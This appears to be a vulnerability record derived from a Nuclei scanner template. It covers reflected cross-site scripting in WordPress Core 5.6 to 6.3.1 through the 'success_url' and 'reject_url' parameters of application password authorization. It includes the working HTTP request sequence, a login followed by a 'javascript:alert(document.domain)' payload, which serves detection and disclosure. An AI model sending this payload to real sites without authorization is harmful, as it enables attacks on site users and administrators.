# Vulnerability: WordPress Core 5.6 and 6.3.1 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`application-pass-xss.yaml`)

## Description
WordPress Core is vulnerable to Reflected Cross-Site Scripting via the 'success_url' and 'reject_url' parameters when requesting application passwords in versions between 5.6 and 6.3.1 due to insufficient input sanitization and output escaping of pseudo protocol URIs.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-login.php HTTP/1.1
Host: {{Hostname}}

POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29 HTTP/1.1
Host: {{Hostname}}
```

